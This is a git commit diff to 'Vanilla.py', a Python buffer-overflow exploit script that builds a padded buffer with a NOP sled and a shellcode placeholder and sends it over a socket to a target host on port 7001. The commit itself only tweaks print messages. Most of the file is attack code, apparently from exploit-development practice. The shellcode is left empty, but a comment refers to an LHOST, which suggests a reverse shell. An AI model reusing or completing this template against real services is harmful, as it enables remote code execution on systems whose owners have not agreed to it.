a70e56fb670d72a939b89b436011376d354d26e3
afsanity <49007301+afsanity@users.noreply.github.com>
2024-02-05 21:44:37 -0700

    Vanilla.py

--- Vanilla.py
+++ Vanilla.py
@@ -3,7 +3,7 @@ import socket
 import sys
 
 try:
-  print("\n[+] Sending buffer...")
+  print("\n [+] Sending buffer...")
   target = sys.argv[1]
   port = 7001
   size = 2560
@@ -13,14 +13,14 @@ try:
   buffer += b"C" * 8 # Buffer of C's before the ESP register
   buffer += b"\x90" * 10 # NOP Sled to pass through decoder stub 
   # Make sure to change the shellcode whenever LHOST changes 
-  buffer += bytearray(" ") # insert shellcode here 
+  buffer += bytearray(" ") # insert shellcode here
 
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target, port))
   s.send(buffer)
   s.close()
   
-  print("\nDone!")
+  print("\n [+] Done!")
   
 except:
   print("\n [-] Error could not send buffer! ")
